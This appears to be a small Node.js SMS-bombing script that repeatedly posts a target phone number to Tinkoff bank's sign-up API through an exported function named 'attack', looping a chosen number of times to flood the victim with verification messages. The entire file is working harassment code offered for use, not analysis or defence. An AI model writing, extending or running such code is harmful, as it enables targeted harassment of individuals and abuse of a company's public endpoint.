//requirements
const fetch = require('node-fetch')
const FormData = require('form-data')
//consts
const delay = 5000
const disable = 10000

function b_tinkoff(number){
    const payload = new FormData()
    payload.append('phone', number)
    fetch('https://api.tinkoff.ru/v1/sign_up', {
        method: 'post',
        body: payload
    })
        .then(r => r.json())
        .then(r => console.log(r))
        .catch(e => console.log(e))
}

this.attack = function attack(number, count) {
    for(let i = 0; i < count; i++){
        b_tinkoff(number)
    }
}